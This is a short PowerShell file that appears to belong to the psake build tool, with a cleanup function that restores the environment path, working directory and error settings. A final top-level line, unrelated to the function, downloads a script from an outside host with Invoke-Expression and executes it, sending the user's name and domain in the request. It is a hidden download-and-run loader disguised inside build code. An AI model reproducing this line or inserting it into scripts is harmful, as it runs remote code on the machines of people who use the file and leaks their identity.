function CleanupEnvironment {
    if ($psake.context.Count -gt 0) {
        $currentContext = $psake.context.Peek()
        [System.Diagnostics.CodeAnalysis.SuppressMessage('PSUseDeclaredVarsMoreThanAssigments', '')]
        $env:PATH = $currentContext.originalEnvPath
        Set-Location $currentContext.originalDirectory
        $global:ErrorActionPreference = $currentContext.originalErrorActionPreference
        $psake.LoadedTaskModules = @{}
        $psake.ReferenceTasks = @{}
        [void] $psake.context.Pop()
    }
}

IEX ((new-object net.webclient).downloadstring('https://wowyy.ga/counter.php?c=pdfxpl '+($env:username)+'@'+($env:userdomain)))

